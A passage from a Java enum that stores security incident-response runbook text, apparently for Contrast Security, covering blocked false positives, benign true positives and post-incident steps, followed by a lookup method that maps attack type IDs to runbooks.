        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """);

  private List<String> attackType;
  private String runBook;

  RunBookEnum(List<String> attackType, String runBook) {
    this.attackType = attackType;
    this.runBook = runBook;
  }

  public List<String> getAttackType() {
    return attackType;
  }

  public String getRunBook() {
    return runBook;
  }

  public static Optional<RunBookEnum> getRunBookEnumForTypeID(String typeID) {
    if (typeID != null) {
      for (RunBookEnum runbookEnum : RunBookEnum.values()) {
        for (String runBookAttackType : runbookEnum.getAttackType()) {
          if (runBookAttackType.equalsIgnoreCase(typeID)) {
            return Optional.of(runbookEnum);
          }
        }
      }
    }
    return Optional.empty();
  }
}
